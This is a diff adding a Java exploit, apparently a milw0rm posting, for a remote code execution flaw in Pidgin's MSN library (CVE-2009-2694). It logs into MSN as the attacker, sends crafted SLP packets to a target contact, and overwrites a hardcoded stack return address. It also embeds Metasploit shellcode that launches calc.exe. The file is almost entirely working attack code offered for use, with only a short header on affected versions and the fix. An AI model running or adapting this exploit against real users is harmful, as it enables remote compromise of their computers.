@@ -1,0 +1,223 @@
+/*
+* Pidgin MSN <= 2.5.8 Remote Code Execution
+*
+* Pierre Nogues - pierz@hotmail.it
+* http://www.indahax.com/
+*
+*
+* Description:
+*        Pidgin is a multi-protocol Instant Messenger.
+*
+*        This is an exploit for the vulnerability[1] discovered in Pidgin by core-security[2].
+*        The library "libmsn" used by pidgin doesn't handle specially crafted MsnSlp packets
+*        which could lead to memory corruption.
+*
+* Affected versions :
+*        Pidgin <= 2.5.8, Adium and other IM using Pidgin-libpurple/libmsn library.
+*
+* Plateforms :
+*        Windows, Linux, Mac
+*
+* Fix :
+*        Fixed in Pidgin 2.5.9
+*        Update to the latest version : http://www.pidgin.im/download/
+*
+* References :
+*        [1] http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-2694
+*        [2] http://www.coresecurity.com/content/libpurple-arbitrary-write
+*        [3] http://www.pidgin.im/news/security/?id=34
+*
+* Usage :
+*        You need the Java MSN Messenger library : http://sourceforge.net/projects/java-jml/
+*        javac.exe -cp "%classpath%;.\jml-1.0b3-full.jar" PidginExploit.java
+*        java -cp "%classpath%;.\jml-1.0b3-full.jar" PdiginExploit YOUR_MSN_EMAIL YOUR_PASSWORD TARGET_MSN_EMAIL
+*
+*/
+
+import net.sf.jml.*;
+import net.sf.jml.event.*;
+import net.sf.jml.impl.*;
+import net.sf.jml.message.p2p.*;
+import net.sf.jml.util.*;
+
+public class PidginExploit {
+
+   private MsnMessenger messenger;
+   private String login;
+   private String password;
+   private String target;
+
+   private int session_id = NumberUtils.getIntRandom();
+
+   private byte shellcode[] = new byte[] {
+
+           /*
+            * if you use the stack in your shellcode do not forgot to change esp because eip == esp == kaboom !
+            * sub esp,500
+            */
+               (byte) 0x81, (byte) 0xEC, (byte) 0x00, (byte) 0x05, (byte) 0x00, (byte) 0x00,
+
+
+           /*
+            * windows/exec - 121 bytes
+            * http://www.metasploit.com
+            * EXITFUNC=process, CMD=calc.exe
+            */
+               (byte) 0xfc, (byte) 0xe8, (byte) 0x44, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x8b, (byte) 0x45,
+               (byte) 0x3c, (byte) 0x8b, (byte) 0x7c, (byte) 0x05, (byte) 0x78, (byte) 0x01, (byte) 0xef, (byte) 0x8b,
+               (byte) 0x4f, (byte) 0x18, (byte) 0x8b, (byte) 0x5f, (byte) 0x20, (byte) 0x01, (byte) 0xeb, (byte) 0x49,
+               (byte) 0x8b, (byte) 0x34, (byte) 0x8b, (byte) 0x01, (byte) 0xee, (byte) 0x31, (byte) 0xc0, (byte) 0x99,
+               (byte) 0xac, (byte) 0x84, (byte) 0xc0, (byte) 0x74, (byte) 0x07, (byte) 0xc1, (byte) 0xca, (byte) 0x0d,
+               (byte) 0x01, (byte) 0xc2, (byte) 0xeb, (byte) 0xf4, (byte) 0x3b, (byte) 0x54, (byte) 0x24, (byte) 0x04,
+               (byte) 0x75, (byte) 0xe5, (byte) 0x8b, (byte) 0x5f, (byte) 0x24, (byte) 0x01, (byte) 0xeb, (byte) 0x66,
+               (byte) 0x8b, (byte) 0x0c, (byte) 0x4b, (byte) 0x8b, (byte) 0x5f, (byte) 0x1c, (byte) 0x01, (byte) 0xeb,
+               (byte) 0x8b, (byte) 0x1c, (byte) 0x8b, (byte) 0x01, (byte) 0xeb, (byte) 0x89, (byte) 0x5c, (byte) 0x24,
+               (byte) 0x04, (byte) 0xc3, (byte) 0x5f, (byte) 0x31, (byte) 0xf6, (byte) 0x60, (byte) 0x56, (byte) 0x64,
+               (byte) 0x8b, (byte) 0x46, (byte) 0x30, (byte) 0x8b, (byte) 0x40, (byte) 0x0c, (byte) 0x8b, (byte) 0x70,
+               (byte) 0x1c, (byte) 0xad, (byte) 0x8b, (byte) 0x68, (byte) 0x08, (byte) 0x89, (byte) 0xf8, (byte) 0x83,
+               (byte) 0xc0, (byte) 0x6a, (byte) 0x50, (byte) 0x68, (byte) 0x7e, (byte) 0xd8, (byte) 0xe2, (byte) 0x73,
+               (byte) 0x68, (byte) 0x98, (byte) 0xfe, (byte) 0x8a, (byte) 0x0e, (byte) 0x57, (byte) 0xff, (byte) 0xe7,
+               (byte) 0x63, (byte) 0x61, (byte) 0x6c, (byte) 0x63, (byte) 0x2e, (byte) 0x65, (byte) 0x78, (byte) 0x65,
+               (byte) 0x00
+           };
+
+   // reteip = pointer to the return address in the stack
+   // The shellcode will be wrote just before reteip
+   // and reteip will automaticly point to the shellcode. It's magic !
+   private int reteip = 0x0022CFCC;    //stack on XP SP3-FR Pidgin 2.5.8
+
+   private int neweip;
+   private byte[] payload = new byte[shellcode.length + 4];
+   private int totallength = reteip + 4;
+
+   public static void main(String[] args) throws Exception {
+
+       if(args.length != 3){
+           System.out.println("PidginExploit YOUR_MSN_EMAIL YOUR_PASSWORD TARGET_MSN_EMAIL");
+       }else{
+           PidginExploit exploit = new PidginExploit(args[0],args[1],args[2]);
+           exploit.start();
+       }
+
+   }
+
+   public PidginExploit(String login, String password, String target){
+       this.login = login;
+       this.password = password;
+       this.target = target;
+
+       neweip = reteip - shellcode.length ;
+
+       for(int i=0;i<shellcode.length;i++)
+           payload[i] = shellcode[i];
+
+       payload[shellcode.length] = (byte)(neweip & 0x000000FF);
+       payload[shellcode.length + 1] = (byte)((neweip & 0x0000FF00) >> 8);
+       payload[shellcode.length + 2] = (byte)((neweip & 0x00FF0000) >> 16);
+       payload[shellcode.length + 3] = (byte)((neweip & 0xFF000000) >> 24);
+   }
+
+   public void start() {
+       messenger = MsnMessengerFactory.createMsnMessenger(login,password);
+       messenger.getOwner().setInitStatus(MsnUserStatus.ONLINE);
+
+       messenger.setLogIncoming(false);
+       messenger.setLogOutgoing(false);
+
+       initMessenger(messenger);
+       messenger.login();
+   }
+
+   protected void initMessenger(MsnMessenger messenger) {
+
+   messenger.addContactListListener(new MsnContactListAdapter() {
+
+           public void contactListInitCompleted(MsnMessenger messenger) {
+
+               final Object id = new Object();
+
+               messenger.addSwitchboardListener(new MsnSwitchboardAdapter() {
+
+                   public void switchboardStarted(MsnSwitchboard switchboard) {
+
+                       if (id != switchboard.getAttachment())
+                           return;
+
+                       switchboard.inviteContact(Email.parseStr(target));
+                   }
+
+                   public void contactJoinSwitchboard(MsnSwitchboard switchboard, MsnContact contact) {
+                       if (id != switchboard.getAttachment())
+                           return;
+
+                       MsnP2PSlpMessage msg = new MsnP2PSlpMessage();
+                       msg.setIdentifier(NumberUtils.getIntRandom());
+                       msg.setSessionId(session_id);
+                       msg.setOffset(0);
+                       msg.setTotalLength(totallength);
+                       msg.setCurrentLength(totallength);
+
+                       // This flag create a bogus MsnSlpPacket in pidgin memory with a buffer pointing to null
+                       // We'll use this buffer to rewrite memory in the stack
+                       msg.setFlag(0x1000020);
+
+                       msg.setP2PDest(target);
+
+                       switchboard.sendMessage(msg);
+
+                       System.out.println("First packet sent, waiting for the ACK");
+
+                   }
+
+                   public void switchboardClosed(MsnSwitchboard switchboard) {
+                       System.out.println("switchboardClosed");
+                       switchboard.getMessenger().removeSwitchboardListener(this);
+                   }
+
+                   public void contactLeaveSwitchboard(MsnSwitchboard switchboard, MsnContact contact){
+                       System.out.println("contactLeaveSwitchboard");
+                   }
+               });
+               messenger.newSwitchboard(id);
+           }
+       });
+
+       messenger.addMessageListener(new MsnMessageAdapter(){
+
+           public void p2pMessageReceived(MsnSwitchboard switchboard,MsnP2PMessage message,MsnContact contact) {
+
+               //We receive the ACK of our first packet with the ID of the new bogus packet
+               message.getIdentifier();
+
+               MsnP2PDataMessage msg = new MsnP2PDataMessage(session_id, message.getIdentifier(), neweip,
+                       payload.length, payload, target);
+
+               switchboard.sendMessage(msg);
+               System.out.println("ACK received && Payload sent !");
+               System.out.println("Exploit OK ! CTRL+C to quit");
+
+           }
+       });
+
+
+
+       messenger.addMessengerListener(new MsnMessengerAdapter() {
+
+           public void loginCompleted(MsnMessenger messenger) {
+               System.out.println(messenger.getOwner().getEmail() + " login");
+           }
+
+           public void logout(MsnMessenger messenger) {
+               System.out.println(messenger.getOwner().getEmail() + " logout");
+           }
+
+           public void exceptionCaught(MsnMessenger messenger,
+                   Throwable throwable) {
+               System.out.println("caught exception: " + throwable);
+           }
+       });
+
+   }
+}
+
+// milw0rm.com [2009-09-09]
